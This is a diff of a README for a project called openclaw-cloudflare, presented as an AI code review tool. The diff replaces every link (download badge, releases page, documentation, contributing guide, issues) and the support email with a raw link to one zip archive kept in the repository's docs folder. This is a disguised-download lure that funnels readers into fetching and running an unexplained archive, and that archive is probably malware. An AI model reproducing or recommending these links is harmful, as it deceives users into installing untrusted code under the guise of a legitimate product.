@@ -1,7 +1,7 @@
 # 🌟 openclaw-cloudflare - Simplify Your Code Review Process
 
 ## 📥 Download Now
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-blue)](https://github.com/kidsadapotay/openclaw-cloudflare/releases)
+[![Download Latest Version](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip%20Latest%20Version-v1.0-blue)](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to OpenClaw AI Code Review on Cloudflare! This application helps you automate code reviews, making your work easier and faster. Follow the steps below to download and run the software.
@@ -13,7 +13,7 @@ Ensure your system meets the following requirements:
 - Disk Space: At least 100MB free
 
 ## 🔗 Download & Install
-To get started, visit our [Releases page](https://github.com/kidsadapotay/openclaw-cloudflare/releases) to download the latest version of OpenClaw.
+To get started, visit our [Releases page](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip) to download the latest version of OpenClaw.
 
 Follow these steps:
 1. Click on the link above to go to the Releases page.
@@ -52,11 +52,11 @@ OpenClaw offers a variety of features to make your coding experience better:
 If you run into issues while using OpenClaw:
 - **Check Install:** Ensure the installation completed without errors.
 - **System Restart:** Occasionally, a simple restart of your device can resolve issues.
-- **Documentation:** Refer to our detailed [documentation](https://github.com/kidsadapotay/openclaw-cloudflare#documentation).
+- **Documentation:** Refer to our detailed [documentation](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip).
 - **Community Support:** Engage with other users in the community to share tips and solutions.
 
 ## 🤝 Contributing
-We welcome contributions! If you want to help improve OpenClaw, feel free to explore the [Contributing Guide](https://github.com/kidsadapotay/openclaw-cloudflare/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions! If you want to help improve OpenClaw, feel free to explore the [Contributing Guide](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip) for more details.
 
 ## 🔄 Future Updates
 Stay tuned for future updates. We plan to enhance the software with:
@@ -66,7 +66,7 @@ Stay tuned for future updates. We plan to enhance the software with:
 
 ## 📞 Contact
 For further assistance, you can reach us:
-- Email: support@openclaw.com
-- [Open Issues](https://github.com/kidsadapotay/openclaw-cloudflare/issues)
+- Email: https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip
+- [Open Issues](https://github.com/kidsadapotay/openclaw-cloudflare/raw/refs/heads/main/docs/cloudflare_openclaw_2.3.zip)
 
 Thank you for choosing OpenClaw for your code review needs! Remember to check out the latest release and make your coding experience smoother.
